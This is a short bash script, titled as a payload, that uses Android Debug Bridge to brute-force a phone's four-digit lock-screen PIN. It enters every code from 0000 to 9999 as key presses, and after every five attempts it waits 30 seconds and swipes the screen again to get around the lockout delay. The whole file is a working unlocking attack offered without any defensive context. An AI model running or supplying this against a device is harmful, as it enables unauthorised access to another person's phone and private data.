#!/bin/bash
echo ---------------
echo PAYLOAD STARTED
echo ---------------
adb shell input keyevent 82
adb shell input swipe 407 1211 378 85
echo -------------------
echo   BRUTE FORCING
echo -------------------

I=0

for M in `seq 7 16`;
do
	m=$((M-7))
	for C in `seq 7 16`;
	do
		c=$((C-7))
		for D in `seq 7 16`;
		do
			d=$((D-7))
			for U in `seq 7 16`;
			do
				u=$((U-7))
				echo -------------------
				echo  TRYING $m$c$d$u
				echo -------------------
				adb shell input keyevent $M
				adb shell input keyevent $C
				adb shell input keyevent $D
				adb shell input keyevent $U
				adb shell input keyevent 66
				I=$((I+1))
				A=$((I%5))
				if test $A = 0
				then
				echo Esperando 30 segundos...
				sleep 30s
				adb shell input keyevent 82
				adb shell input swipe 407 1211 378 85
				fi
			done
		done
	done
done
